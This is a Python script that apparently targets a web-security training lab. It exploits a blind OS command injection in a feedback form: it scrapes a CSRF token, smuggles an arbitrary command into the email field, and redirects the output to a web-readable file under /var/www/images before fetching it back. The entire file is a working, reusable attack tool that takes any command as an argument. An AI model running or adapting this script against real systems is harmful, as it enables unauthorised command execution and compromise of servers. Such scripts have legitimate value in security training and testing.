import sys
import requests
from bs4 import BeautifulSoup as bs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def csrftoken(url, s):
    u3 = url + "feedback"
    r = s.get(u3, verify=False, proxies=proxies)
    soup = bs(r.text, 'html.parser')
    csrf = soup.find('input')["value"]
    return csrf

def exploit(url, c, s):
    print("Exploiting command injection...")
    u = url + "feedback/submit"
    csrft = csrftoken(url, s)
    data = {'csrf':csrft,'name':'a','email':f'a@a.com & {c} > /var/www/images/out.txt #','subject':'a','message':'a'}
    r = s.post(u, data=data, verify=False, proxies=proxies)
    print("Let's check the output...")
    u2 = url + "image?filename=out.txt"
    r2 = s.get(u2, verify=False, proxies=proxies)
    if (r2.status_code == 200):
        print("Success!")
        print(r2.text)
    else:
        print("fail!")


def main():
    try:
        url = sys.argv[1]
        c = sys.argv[2]
        s = requests.Session()
        exploit(url, c, s)
    except IndexError:
        print("Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

if __name__ == '__main__':
    main()
